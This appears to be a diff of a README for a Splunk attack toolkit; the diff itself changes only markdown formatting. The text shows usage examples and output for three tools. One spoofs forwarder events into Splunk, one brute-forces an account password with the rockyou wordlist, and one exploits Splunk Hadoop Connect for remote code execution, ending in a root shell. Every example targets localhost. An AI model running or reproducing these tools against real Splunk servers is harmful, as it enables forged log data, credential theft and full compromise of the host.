@@ -1,4 +1,4 @@
-[spooforward.py]
+## [spooforward.py]
 
 [i] Splunk forward spoofer v0.1
 
@@ -18,7 +18,7 @@ USAGE: ./spooforward.py [options]:
 
 Example:
 
-▶ ~/DEV/splunk_tools ◀
+```▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./spooforward.py -c -d -r 127.0.0.1 -l spoofedaddr.net -i main -t spoofedtype -s spoofedsource  -m "some event message"
 
 [i] Splunk forward spoofer v0.1
@@ -32,11 +32,12 @@ root@postern ⌁ ./spooforward.py -c -d -r 127.0.0.1 -l spoofedaddr.net -i main 
 [DBG] [RCV] '\x00\x00\x00\x9a\x00\x00\x00\x01\x00\x00\x00\x12__s2s_control_msg\x00\x00\x00\x00ocap_response=success;cap_flush_key=true;idx_can_send_hb=true;idx_can_recv_token=true;v4=true;channel_limit=300\x00\x00\x00\x00\x00\x00\x00\x00\x05_raw\x00'
 
 [DBG] [FIN] PAYLOAD SUCCESSFULY SENT
+```
 
 
-[splunk_brute.sh]
+## [splunk_brute.sh]
 
-▶ ~/DEV/splunk_tools ◀
+```▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./splunk_brute.sh test_acc /usr/share/wordlists/rockyou.txt 127.0.0.1 8000
 
 [!] Bruteforcing password for test_acc on 127.0.0.1...
@@ -44,9 +45,9 @@ root@postern ⌁ ./splunk_brute.sh test_acc /usr/share/wordlists/rockyou.txt 127
 SUCCESS! U: test_acc P: 1234567890
 
 ...Terminated
+```
 
-
-[hdfs_exploit.sh]
+## [hdfs_exploit.sh]
 
 Splunk Hadoop Connect Remote Code Execution
 
@@ -74,7 +75,7 @@ Usage:
 
 
 
-▶ ~/DEV/splunk_tools ◀
+```▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./hdfs_exploit.sh -c -h 127.0.0.1 -m w00tw00tw00t
 
 [i] Splunk forward spoofer v0.1
@@ -97,7 +98,9 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 pwd
 /opt/splunk/etc/apps/search/bin
+uname -a
 Linux postern 4.8.0-kali2-amd64 #1 SMP Debian 4.8.15-1kali1 (2016-12-23) x86_64 GNU/Linux
+```
 
 
 
